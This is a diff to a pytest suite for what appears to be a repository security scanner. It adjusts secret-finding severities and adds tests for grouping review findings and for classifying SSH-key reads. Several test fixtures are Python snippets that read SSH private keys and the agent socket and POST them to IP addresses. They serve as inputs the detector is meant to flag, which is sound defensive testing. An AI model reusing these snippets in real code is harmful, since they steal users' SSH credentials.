@@ -33,8 +33,9 @@ def _scan(files: dict[str, str]) -> dict:
 # ------------------------------------------------------------------ certbot: secrets in test/sample/asset paths
 
 def test_certbot_style_asset_key_uses_the_new_review_rule():
+    # 2026.11.07-8: info (was review in -7), consistent with the exact tests/ and docs/ fixture rule
     f = next(x for x in _scan({"certbot-ci/certbot_integration_tests/assets/key.pem": KEY})["findings"] if x["source"] == "Secrets")
-    assert f["sev"] == "Medium" and not f["strong"] and "assets" in f["review_reason"]
+    assert f["sev"] == "Low" and not f["strong"] and "assets" in f["info_reason"] and "to info" in f["info_reason"]
 
 
 @pytest.mark.parametrize("path", ["certbot-ci/certbot_integration_tests/assets/key.pem",
@@ -48,13 +49,14 @@ def test_test_and_sample_path_keys_are_review_not_strong(path):
     assert sec and not any(f["strong"] for f in sec), sec
     f = sec[0]
     assert res["secrets_strong"] == 0 and res["strong"] == 0
-    if f["sev"] == "Low":
-        # an exact tests/docs directory was already a fixture path before this change (Low, no tier)
+    # 2026.11.07-8: every such path is info (Low, no tier); in -7 the token-matched ones were review
+    assert f["sev"] == "Low"
+    d = next(x for x in res["detectors"] if x["detector"] == "repo_secrets")
+    assert d["tier"] == "none_found" and not d["findings"]
+    if "info_reason" in f:
+        assert "Downgraded from strong to info" in f["info_reason"] and d["info_findings"]
+    else:   # an exact tests/docs directory: the existing fixture rule
         assert "test/example/doc/source file" in f["rule"]
-    else:
-        assert f["sev"] == "Medium" and "Downgraded from strong to review" in f["review_reason"]
-        d = next(x for x in res["detectors"] if x["detector"] == "repo_secrets")
-        assert d["tier"] == "review"                              # still surfaced for a human, without the 49 cap
 
 
 @pytest.mark.parametrize("path", ["key.pem", "src/server/key.pem", "deploy/prod.key"])
@@ -178,3 +180,68 @@ def test_no_findings_says_no_limiting_pillar():
     t = _trust(make_result("release_delta", "Integrity", "ran", []))
     assert t["limiting_reason"] == NO_LIMIT_REASON and t["limiting_pillar"] is None and t["limiting_kind"] is None
     assert "limited by" not in t["limiting_reason"]
+
+
+
+# ================================================================== round 2 (ruleset 2026.11.07-8)
+
+from detectors.base import enrich
+from pillars import group_review, score_pillar
+
+
+def _rv(rule, file, line=1, det="behavior_patterns"):
+    return enrich({"sev": "Medium", "source": "t", "rule": rule, "file": file, "line": line, "detail": "", "fix": "",
+                   "url": None, "strong": False}, det, "review")
+
+
+def test_review_findings_count_once_per_rule_and_top_level_directory():
+    fs = [_rv("Network: exfil-style endpoint", f"tests/unit/t{i}.py", i) for i in range(40)] + \
+         [_rv("Network: exfil-style endpoint", "src/pkg/a.py"), _rv("Network: exfil-style endpoint", "src/pkg/b.py"),
+          _rv("Other rule", "src/pkg/a.py", 9)]
+    p = score_pillar("Behavior", [make_result("behavior_patterns", "Behavior", "ran", fs)])
+    assert p["score"] == 100 - 3 * 8                               # groups: (rule, tests), (rule, src), (other, src)
+    g = next(f for f in p["findings"] if f.get("group_size") == 40)
+    grp = next(e for e in g["evidence"] if e["type"] == "group")
+    assert grp["top_dir"] == "tests" and grp["count"] == 40 and len(grp["files"]) == 40 and "tests/unit/t0.py:0" in grp["files"]
+
+
+def test_grouping_never_merges_high_risk_and_keeps_root_files_separate():
+    hr = [enrich({**_rv("x", f"src/f{i}.py"), "strong": True}, "behavior_patterns", "high_risk") for i in range(2)]
+    root = [_rv("y", "setup.py"), _rv("y", "tasks.py")]
+    out = group_review(hr + root)
+    assert sum(f["tier"] == "high_risk" for f in out) == 2
+    assert [f.get("group_size") for f in out if f["tier"] == "review"] == [2]   # both root files: group "."
+
+
+def test_ssh_config_known_hosts_authorized_keys_are_not_sources():
+    for p in ("~/.ssh/config", "~/.ssh/known_hosts", "~/.ssh/authorized_keys"):
+        code = f"import os, requests\nd = open(os.path.expanduser('{p}')).read()\nrequests.post('http://198.51.100.3/x', data=d)\n"
+        assert CE.analyse_python("pkg/x.py", code, set(), owner_names={"acme"})[0] == [], p
+    for p in ("~/.ssh/id_ed25519", "~/.ssh/deploy.pem", "~/.ssh/github_rsa", "~/.ssh/work_ecdsa"):
+        code = f"import os, requests\nd = open(os.path.expanduser('{p}')).read()\nrequests.post('http://198.51.100.3/x', data=d)\n"
+        assert [f["tier"] for f in CE.analyse_python("pkg/x.py", code, set(), owner_names={"acme"})[0]] == ["high_risk"], p
+
+
+SSH_LIB_CODE = ("import os, socket, requests\n"
+                "key = open(os.path.expanduser('~/.ssh/id_rsa')).read()\n"
+                "agent = os.environ['SSH_AUTH_SOCK']\n"
+                "def connect(host):\n    requests.post(host, data={'k': key, 'a': agent})\n")
+
+
+@pytest.mark.parametrize("lib", ["paramiko", "asyncssh", "fabric"])
+def test_ssh_client_libraries_own_ssh_keys_and_agent_socket(lib):
+    assert CE.analyse_python(f"{lib}/client.py", SSH_LIB_CODE, set(), owner_names={lib})[0] == []
+
+
+def test_unrelated_package_reading_ssh_private_key_is_unchanged():
+    # dynamic destination: review (as before); raw IP: high_risk (as before)
+    dyn = CE.analyse_python("pkg/x.py", SSH_LIB_CODE, set(), owner_names={"acme", "stats"})[0]
+    assert [f["tier"] for f in dyn] == ["review"] and "Bulk" in dyn[0]["rule"]
+    raw = SSH_LIB_CODE.replace("requests.post(host,", "requests.post('http://198.51.100.8/k',")
+    assert [f["tier"] for f in CE.analyse_python("pkg/x.py", raw, set(), owner_names={"acme"})[0]] == ["high_risk"]
+
+
+def test_ssh_alias_list_is_explicit_and_documented():
+    assert CE.SSH_CLIENT_LIBS == {"paramiko", "asyncssh", "fabric"}
+    import inspect
+    assert "HAND-MAINTAINED" in inspect.getsource(CE)
